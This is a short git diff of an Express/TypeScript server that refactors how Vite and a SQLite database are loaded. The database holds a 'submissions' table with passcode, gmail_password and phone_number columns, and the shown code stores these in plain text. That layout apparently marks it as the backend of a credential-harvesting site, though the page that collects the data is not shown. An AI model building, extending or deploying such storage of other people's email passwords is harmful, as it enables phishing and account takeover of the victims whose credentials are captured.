@@ -1,5 +1,4 @@
 import express from "express";
-import { createServer as createViteServer } from "vite";
 import path from "path";
 import { fileURLToPath } from "url";
 import fs from "fs";
@@ -18,23 +17,27 @@ const upload = multer({ storage: multer.memoryStorage() });
 let db: any = null;
 const dbPath = path.resolve(__dirname, "submissions.db");
 
-if (!process.env.VERCEL) {
-  try {
-    const Database = (await import("better-sqlite3")).default;
-    db = new Database(dbPath);
-    db.exec(`
-      CREATE TABLE IF NOT EXISTS submissions (
-        id INTEGER PRIMARY KEY AUTOINCREMENT,
-        passcode TEXT,
-        gmail_password TEXT,
-        phone_number TEXT,
-        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
-      )
-    `);
-  } catch (err) {
-    console.error("DB Error:", err);
+async function initDb() {
+  if (!process.env.VERCEL) {
+    try {
+      const Database = (await import("better-sqlite3")).default;
+      db = new Database(dbPath);
+      db.exec(`
+        CREATE TABLE IF NOT EXISTS submissions (
+          id INTEGER PRIMARY KEY AUTOINCREMENT,
+          passcode TEXT,
+          gmail_password TEXT,
+          phone_number TEXT,
+          created_at DATETIME DEFAULT CURRENT_TIMESTAMP
+        )
+      `);
+    } catch (err) {
+      console.error("DB Error:", err);
+    }
   }
 }
+
+initDb();
 
 app.use(cors());
 app.use(express.json());
@@ -143,6 +146,7 @@ app.use("/data-api/v1", apiRouter);
 
 // Vite / Static serving
 if (process.env.NODE_ENV !== "production" && !process.env.VERCEL) {
+  const { createServer: createViteServer } = await import("vite");
   const vite = await createViteServer({ server: { middlewareMode: true }, appType: "custom" });
   app.use(vite.middlewares);
   app.get("*", async (req, res, next) => {
